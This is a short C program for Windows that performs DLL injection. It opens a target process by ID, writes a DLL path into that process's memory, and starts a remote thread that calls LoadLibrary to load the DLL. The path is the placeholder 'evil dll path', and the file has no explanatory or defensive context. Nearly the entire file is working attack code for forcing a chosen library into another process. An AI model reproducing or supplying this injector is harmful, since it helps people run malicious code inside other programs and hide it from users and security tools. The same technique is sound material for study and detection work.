#include "tchar.h"
#include <windows.h>
#include <TlHelp32.h>
#include <stdio.h>

#ifdef UNICODE
#define LOAD_LIBRARY "LoadLibraryW"
#else
#define LOAD_LIBRARY "LoadLibraryA"
#endif

int _tmain(int argc, TCHAR **argv)
{
    if (argc < 2)
    {
        _tprintf(TEXT("Please enter process id as argument\r\n"));
        return 1;
    }

    DWORD pid = _tstoi(argv[1]);
    HANDLE pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    if (pHandle == NULL)
    {
        _tprintf(TEXT("Failed get process handle\r\n"));
        printf("Error code - %d", GetLastError());
        return 1;
    }

    TCHAR dllPath[] = TEXT("evil dll path");
    SIZE_T dllPathLen = (_tcslen(dllPath) + 1) * sizeof(TCHAR);
    LPVOID lpAddrAlloced = VirtualAllocEx(pHandle, NULL, dllPathLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (lpAddrAlloced == NULL)
    {
        _tprintf(TEXT("Failed to alloc process memory\r\n"));
        printf("Error code - %d", GetLastError());
        return 1;
    }
    SIZE_T writed = 0;
    if (WriteProcessMemory(pHandle, lpAddrAlloced, dllPath, dllPathLen, &writed) == 0)
    {
        _tprintf(TEXT("Failed to write process memory\r\n"));
        printf("Error code - %d", GetLastError());
        return 1;
    }

    HMODULE hKernel = GetModuleHandle(TEXT("kernel32.dll"));
    if (hKernel == NULL)
    {
        return 1;
    }

    LPVOID lpLoadLibrary = GetProcAddress(hKernel, LOAD_LIBRARY);
    if (lpLoadLibrary == NULL)
    {
        return 1;
    }

    DWORD tid;
    HANDLE tHandle = CreateRemoteThread(pHandle, NULL, 0, (LPTHREAD_START_ROUTINE)lpLoadLibrary, lpAddrAlloced, 0, &tid);
    if (tHandle == NULL)
    {
        _tprintf(TEXT("Failed to creating remote thread\r\n"));
        printf("Error code - %d", GetLastError());
        return 1;
    }

    _tprintf(TEXT("injecting...\r\n"));

    return 0;
}